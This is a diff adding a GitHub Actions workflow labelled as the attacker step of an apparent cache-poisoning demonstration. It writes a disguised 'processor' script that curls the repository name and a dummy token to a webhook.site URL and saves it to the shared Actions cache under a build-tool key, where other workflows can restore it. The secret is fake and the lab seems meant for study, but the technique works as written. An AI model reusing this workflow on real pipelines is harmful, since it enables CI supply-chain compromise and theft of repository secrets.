@@ -1,0 +1,30 @@
+name: 1. Attacker - Poison Cache
+on: workflow_dispatch # Manual trigger
+
+jobs:
+  poison-job:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Inject Script Payload
+        run: |
+          cat << 'EOF' > processor
+          #!/bin/bash
+          echo "[!] POISONED CACHE TRIGGERED"
+          
+          # Simulated Exfiltration to Webhook.site
+          # REPLACE THE URL BELOW WITH YOUR WEBHOOK.SITE URL
+          curl -X POST -H "Content-Type: application/json" \
+              -d "{\"alert\": \"Cache Poisoned\", \"victim_repo\": \"$GITHUB_REPOSITORY\", \"fake_secret\": \"ghp_DUMMY_TOKEN_999\"}" \
+              https://webhook.site/9296d24e-d079-45b8-a9ce-90a081912ddd
+
+          # The Canary
+          touch CANARY_ACTIVE
+          echo "Processing data normally..."
+          EOF
+          chmod +x processor
+
+      - name: Upload Malicious Cache
+        uses: actions/cache/save@v3
+        with:
+          path: processor
+          key: ${{ runner.os }}-build-tool-v1
